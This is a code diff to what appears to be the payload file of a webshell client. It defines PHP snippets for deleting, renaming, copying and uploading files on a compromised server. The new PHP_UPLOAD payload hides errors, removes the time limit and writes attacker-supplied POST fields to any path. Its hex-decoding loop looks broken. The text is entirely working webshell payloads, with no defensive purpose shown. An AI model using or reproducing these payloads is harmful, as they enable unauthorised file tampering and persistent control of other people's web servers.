@@ -18,13 +18,17 @@ PHP_DELETE = '''@@if(unlink("##")){echo 'done';}else{echo 'something err';}'''
 PHP_RENAME = '''@@if(rename("#1","#2")){echo 'done';}else{echo 'something err';}'''
 PHP_COPY = '''@@if(copy("#1","#2")){echo 'done';}else{echo 'something err';}'''
 
-PHP_UPLOAD ='''@@$file="#1";$strtofile="#2";$ff=fopen($file, "w");if($ff){echo 'done';\
-        fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);'''
+# PHP_UPLOAD ='''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);\
+#         @@$file="#1";$strtofile=$POST["uploadDate"];if($strtofile!=null){echo $strtofile;$ff=fopen($file, "wb");\
+#         if($ff){echo 'done';fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);die();}'''
+# PHP_UPLOAD ='''@@$file="#1";$strtofile="#2";echo $strtofile;$ff=fopen($file, "wb");if($ff){echo 'done';\
+#         fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);'''
+PHP_UPLOAD='''@ini_set("display_errors","0");@set_time_limit(0);@ini_set("set_magic_quotes_runtime","0");\
+        $f=$_POST["z1"];$c=$_POST["z2"];$c=str_replace("\r","",$c);\
+        $c=str_replace("\n","",$c);$buf="";\
+        for($i=0;$i<strlen($c);$i+=2)$buf.=substr($c,$i,2);\
+        echo(@fwrite(fopen($f,"w"),$buf)?"done!":"false!");die();'''
 
-PHP_test = '''$ff=fopen("newfile.txt","r");echo fgets($ff,1024);'''
-
-
-ASP_test = ''' '''
 ##################################################################################################
 
 JSP_fileBaseCode='''uname'''
